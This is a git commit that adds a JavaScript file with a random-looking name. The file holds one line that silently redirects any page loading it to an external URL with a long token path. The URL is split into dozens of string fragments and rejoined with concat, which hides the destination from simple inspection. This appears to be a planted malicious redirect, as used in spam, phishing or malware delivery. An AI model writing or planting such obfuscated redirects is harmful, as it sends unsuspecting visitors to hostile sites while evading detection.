3608a568c3fe19fda8f625b3cb97febcd50773e7
Excessors <113865732+Excessors@users.noreply.github.com>
2023-01-01 01:30:56 +0100

    Create jhdrfhyfjdrhdfghndtyhdfhdrt.js

---
+++ jhdrfhyfjdrhdfghndtyhdfhdrt.js
@@ -0,0 +1,1 @@
+window.location.replace(``.concat(`ht`,`tp`,`s:/`,`/ww`,`w.ro`,`adswo`,`rks.c`,`om/V`,`0p0l`,`jJEc`,`XBB`,`oh1Zf`,`2-7c`,`2Tw7`,`3pHj`,`tNl4`,`iRLX`,`cuwV`,`8KV`,`tRR`,`BbVO`,`5J0f`,`qj9A`,`K-7B`,`14IYK`,`79da-`,`mP-W`,`ZMod`,`vf_e`,`A~~/TA`,`HA/6yhqgfjzfc`))
